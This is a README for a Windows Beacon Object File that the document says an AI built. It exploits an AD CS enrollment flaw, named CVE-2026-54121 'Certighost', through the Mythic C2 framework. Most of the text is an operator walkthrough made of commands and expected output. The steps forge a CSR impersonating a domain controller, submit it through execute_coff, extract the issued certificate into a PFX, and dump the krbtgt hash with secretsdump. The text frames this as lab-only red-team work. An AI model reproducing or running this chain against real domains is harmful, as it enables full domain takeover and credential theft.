# Certighost BOF

> **Disclosure:** This project was developed entirely by AI using the Hermes harness.

Certighost is a Windows x64 Beacon Object File for the enrollment-only portion of the Certighost / CVE-2026-54121 lab chain. It submits a caller-supplied in-memory PKCS#10 request through `ICertRequest::Submit` with `CR_IN_BINARY | CR_IN_PKCS10 | CR_IN_RPC`, then returns the disposition, request ID, and issued certificate bytes over Beacon output.

This is REDANTONETTA lab-only work. The BOF writes no target-side files and does not create machine accounts, start listeners, perform PKINIT, dump secrets, submit Mythic tasks, or automate rollback.

## Stock Mythic Walkthrough

Use this path only in an approved disposable Certighost lab with an already authorized Windows x64 Apollo callback and controlled callback listeners. It uses Apollo's stock `register_file` and stock `execute_coff` commands only. There is no custom Mythic command, alias, plugin, or API task submission in this repository.

### 1. Build The Reviewed BOF

```sh
make bof
shasum -a 256 build/certighost.x64.o
```

Record the digest against the reviewed commit before using the object.

### 2. Register The BOF In Mythic

In the authorized Apollo callback, run the stock command:

```text
register_file
```

Use Mythic's file picker to select `build/certighost.x64.o` from the operator workstation. Keep the registered filename `certighost.x64.o`. Then confirm that the `execute_coff` `-Coff` picker shows `certighost.x64.o`. This is an in-memory BOF registration path; do not upload or save anything on the target.

### 3. Generate A Fresh Key And CSR Locally

Use OpenSSL and shell only. The private key stays in an operator-local ephemeral directory and must remain paired with the issued certificate.

```sh
umask 077
export RUN_DIR="$HOME/RedAntonetta/artifacts/certighost-run"
mkdir -p "$RUN_DIR"

openssl req -new -newkey rsa:2048 -nodes \
  -keyout "$RUN_DIR/target-dc.key.pem" \
  -out "$RUN_DIR/target-dc.csr.pem" \
  -subj '/CN=ra-dc01.certighost.redantonetta.test' \
  -addext 'subjectAltName=DNS:ra-dc01.certighost.redantonetta.test'

openssl req -in "$RUN_DIR/target-dc.csr.pem" -outform DER \
  -out "$RUN_DIR/target-dc.csr.der"
openssl req -in "$RUN_DIR/target-dc.csr.pem" -noout -verify -subject

openssl base64 -A -in "$RUN_DIR/target-dc.csr.der" > "$RUN_DIR/target-dc.csr.der.b64"
```

Open `$RUN_DIR/target-dc.csr.der.b64` and copy its single line for the first argument below. Do not base64-encode the five text values.

### 4. Run One Mixed `execute_coff` Command

Apollo `execute_coff` v3 must receive one `base64` argument followed by five `string` arguments in this exact order:

```text
csr_der, ca_config, template, san_dns, cdc, rmd
```

Paste one command into the authorized callback. This sanitized concrete example shows the full mixed shape; replace only `<PASTE_CSR_DER_B64>` with the single-line CSR value generated above.

```text
execute_coff -Coff certighost.x64.o -Function go -Timeout 30 -Arguments base64:<PASTE_CSR_DER_B64> string:ra-ca01.certighost.redantonetta.test\REDANTONETTA-CERTIGHOST-CA string:Machine string:ra-dc01.certighost.redantonetta.test string:ra-listener.certighost.redantonetta.test string:ra-dc01.certighost.redantonetta.test
```

The text values in that example mean:

| Position | Field | Example |
| --- | --- | --- |
| 1 | `csr_der` | Base64 of the raw DER CSR bytes |
| 2 | `ca_config` | `ra-ca01.certighost.redantonetta.test\REDANTONETTA-CERTIGHOST-CA` |
| 3 | `template` | `Machine` |
| 4 | `san_dns` | `ra-dc01.certighost.redantonetta.test` |
| 5 | `cdc` | `ra-listener.certighost.redantonetta.test` |
| 6 | `rmd` | `ra-dc01.certighost.redantonetta.test` |

`san_dns` may be empty when the approved lab case requires no SAN. `ca_config`, `template`, `cdc`, and `rmd` are required.

### 5. Read The Result

A vulnerable lab CA returns an issued result and a framed base64 certificate:

```text
CERTIGHOST_RESULT disposition=3 request_id=41 cert_encoding=base64 cert_der_bytes=<n> cert_base64_chars=<n>CERTIGHOST_CERT_BEGIN
<base64 DER certificate>
CERTIGHOST_CERT_END
```

Apollo commonly aggregates the result header directly with `CERTIGHOST_CERT_BEGIN`; that missing newline is expected.

A patched negative control returns no certificate block:

```text
certighost: request not issued (disposition=2 request_id=42 last_status=0x80094800)
certighost: CA message: The request was denied.
```

Stop if the disposition is not `3`. Preserve only sanitized task/output identifiers and the approved evidence records.

### 6. Extract The Certificate And Prove Key Continuity

Save the complete Mythic output as `$RUN_DIR/mythic-output.txt`, then extract the certificate locally:

```sh
awk '/CERTIGHOST_CERT_BEGIN/{capture=1;next}/CERTIGHOST_CERT_END/{capture=0}capture' \
  "$RUN_DIR/mythic-output.txt" | tr -d '[:space:]' | \
  openssl base64 -d -A -out "$RUN_DIR/issued-cert.der"

openssl x509 -inform DER -in "$RUN_DIR/issued-cert.der" \
  -out "$RUN_DIR/issued-cert.pem"
openssl x509 -in "$RUN_DIR/issued-cert.pem" -noout \
  -subject -issuer -serial -ext subjectAltName

openssl pkey -in "$RUN_DIR/target-dc.key.pem" -pubout -outform DER | \
  openssl dgst -sha256
openssl x509 -in "$RUN_DIR/issued-cert.pem" -pubkey -noout | \
  openssl pkey -pubin -outform DER | openssl dgst -sha256
```

The two SHA-256 SPKI digests must match. If they do not match, do not use the certificate.

Create a transient PFX only after continuity is proven. Omitting `-passout` uses OpenSSL's hidden export-password prompt without exposing it on argv.

```sh
openssl pkcs12 -export \
  -inkey "$RUN_DIR/target-dc.key.pem" \
  -in "$RUN_DIR/issued-cert.pem" \
  -out "$RUN_DIR/issued-cert.pfx"
chmod 600 "$RUN_DIR/issued-cert.pfx"
```

### 7. Keep Downstream Scope To `krbtgt` Only

PKINIT and replication proof stay outside this repository. If the separately approved harness obtains a TGT from the transient PFX, use it only for the one-account proof:

```sh
KRB5CCNAME="$RUN_DIR/target-dc.ccache" \
  secretsdump.py -k -no-pass -just-dc-user 'krbtgt' \
  'REDANTONETTA.TEST/RA-DC01$@ra-dc01.certighost.redantonetta.test'
```

Do not remove `-just-dc-user 'krbtgt'`, request additional accounts, or perform a broad dump. Retain only sanitized evidence that one account was requested, the result count was `1`, the RID was `502`, an NT hash was present, and `broad_dump_performed` was `false`.

### 8. Clean Up Local Secrets And Roll Back The Lab

Stop the external listeners and remove the operator-local artifacts created for this run:

```sh
rm -f "$RUN_DIR/target-dc.key.pem" \
      "$RUN_DIR/target-dc.csr.pem" \
      "$RUN_DIR/target-dc.csr.der" \
      "$RUN_DIR/target-dc.csr.der.b64" \
      "$RUN_DIR/issued-cert.der" \
      "$RUN_DIR/issued-cert.pem" \
      "$RUN_DIR/issued-cert.pfx" \
      "$RUN_DIR/target-dc.ccache" \
      "$RUN_DIR/mythic-output.txt"
rmdir "$RUN_DIR" 2>/dev/null || true
```

Then use the approved disposable-lab rollback workflow for the DC and CA snapshots. A later validation must use a fresh callback, CSR, key, and run directory.

## Argument Contract

Apollo `execute_coff` v3 packs the mixed typed array as one outer little-endian `u32` payload length followed by six length-prefixed slices. The first `base64` entry is decoded raw DER. Each `string` entry is UTF-8 bytes plus exactly one terminal NUL inside its slice length.

```text
[base64, csr_der_b64]
[string, ca_config]
[string, template]
[string, san_dns]
[string, cdc]
[string, rmd]
```

The BOF strips exactly one terminal NUL from each text slice before validation and use. It rejects embedded NULs, empty required text after normalization, malformed framing, truncation, trailing bytes, extra arguments, and invalid field order. For compatibility with older packed callers, valid legacy all-base64 text slices without terminal NULs are still accepted.

| Field | Validation |
| --- | --- |
| `csr_der` | Non-empty, at most 256 KiB, bounded outer DER `SEQUENCE`; arbitrary DER bytes are preserved |
| `ca_config` | ASCII `host\CAName`, at most 512 bytes |
| `template` | Visible ASCII without `:` or newlines, at most 128 bytes |
| `san_dns` | Optional empty value, otherwise DNS/IP-like ASCII, at most 255 bytes |
| `cdc` | Required DNS/IP-like ASCII, at most 255 bytes |
| `rmd` | Required DNS/IP-like ASCII, at most 255 bytes |

The in-memory attributes remain:

```text
CertificateTemplate:<template>
SAN:dns=<san_dns>
cdc:<cdc>
rmd:<rmd>
```

The `SAN:dns=` line is omitted only when `san_dns` is empty.

## Optional Offline Helpers

`tools/certighost_mythic.py` and `tools/certighost_operator.py` are optional offline helpers for descriptor generation, fixture validation, local extraction, and test coverage. They do not contact Mythic or a target, and they are not required for the stock walkthrough above.

Apollo's stock typed-array CLI splits argument tokens on spaces. The optional helpers therefore refuse text values containing spaces or edge quotes instead of emitting an operator command that would not reproduce the recorded frame; the BOF ABI itself remains compatible with otherwise valid packed text slices.

```sh
PYTHONPYCACHEPREFIX=build/pycache python3 -m tools.certighost_mythic \
  validate-evidence tests/fixtures/mythic/vulnerable-success.json
PYTHONPYCACHEPREFIX=build/pycache python3 -m tools.certighost_mythic \
  validate-evidence tests/fixtures/mythic/patched-negative-control.json
```

## Build And Test

```sh
make test
make bof
make lint
make imports
git diff --check
```

`make bof` prefers `x86_64-w64-mingw32-gcc` when present and otherwise uses the installed LLVM clang cross-target path. `make test` runs the host-side parser harness and offline Python workflow tests.

## Documentation

- [Offline Apollo execute_coff v3 integration](docs/mythic-integration.md)
- [Sanitized manual full-chain validation](docs/manual-full-chain-validation.md)
- [CVE-2026-54121 / Certighost research](docs/research/CVE-2026-54121.md)
